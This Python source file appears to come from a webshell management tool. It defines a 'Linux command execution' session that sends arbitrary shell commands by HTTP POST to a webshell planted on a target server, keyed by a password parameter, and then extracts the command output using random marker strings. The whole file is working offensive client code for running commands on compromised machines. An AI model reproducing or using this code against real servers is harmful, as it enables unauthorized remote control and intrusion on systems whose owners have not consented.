import typing as t
import logging

import httpx

from ..core import exceptions

from ..core.base import (
    register_session,
    ConnOption,
    ConnOptionGroup,
    get_http_client,
)

from ..utils.random_data import random_string

logger = logging.getLogger("core.sessions.linux_cmd_oneliner")

WRAPPER_CODE = """
echo "{start1}""{start2}";
({code})
echo {stop}
"""


@register_session
class LinuxCmdOneLiner:
    session_type = "LINUX_CMD_ONELINER"
    readable_name = "Linux命令执行"
    conn_options: t.List[ConnOptionGroup] = [
        {
            "name": "基本连接配置",
            "options": [
                ConnOption(
                    id="url",
                    name="地址",
                    type="text",
                    placeholder="http://xxx.com",
                    default_value=None,
                    alternatives=None,
                ),
                ConnOption(
                    id="password",
                    name="密码",
                    type="text",
                    placeholder="cmd",
                    default_value=None,
                    alternatives=None,
                ),
            ],
        },
        {
            "name": "高级连接配置",
            "options": [
                ConnOption(
                    id="https_verify",
                    name="验证HTTPS证书",
                    type="checkbox",
                    placeholder=None,
                    default_value=True,
                    alternatives=None,
                ),
            ],
        },
    ]

    def __init__(self, session_conn: dict):
        # super().__init__(session_conn)
        self.url = session_conn["url"]
        self.password = session_conn["password"]
        self.https_verify = session_conn.get("https_verify", False)
        self.client = get_http_client(verify=self.https_verify)

    async def execute_cmd(self, cmd):
        return await self.submit(cmd)

    async def submit(self, payload: str):
        start1, start2, stop = random_string(6), random_string(6), random_string(12)
        # we use f-string here because shell commands normally don't
        # has brackets unlike php code
        code = WRAPPER_CODE.format(
            start1=start1, start2=start2, code=payload, stop=stop
        )
        status_code, html = await self.submit_http(code)
        if status_code == 404:
            raise exceptions.TargetUnreachable(
                f"状态码404, 没有这个webshell: {status_code}"
            )
        if (start1 + start2) not in html:
            raise exceptions.PayloadOutputError(
                "找不到输出文本的开头，也许webshell没有执行代码？"
            )
        html_afterstarted = html[html.index(start1 + start2) + len(start1 + start2) :]
        if stop not in html_afterstarted:
            raise exceptions.PayloadOutputError(
                "找不到输出文本的结尾，也许webshell没有执行代码？"
            )
        result = html_afterstarted[: html_afterstarted.index(stop)]
        return result.removeprefix("\n")

    async def submit_http(self, payload: t.Union[str, bytes]):
        try:
            response = await self.client.request(
                method="POST", url=self.url, data={self.password: payload}
            )
            return response.status_code, response.text
        except httpx.TimeoutException as exc:
            raise exceptions.NetworkError("HTTP请求受控端超时") from exc
        except httpx.HTTPError as exc:
            raise exceptions.NetworkError("发送HTTP请求到受控端失败") from exc
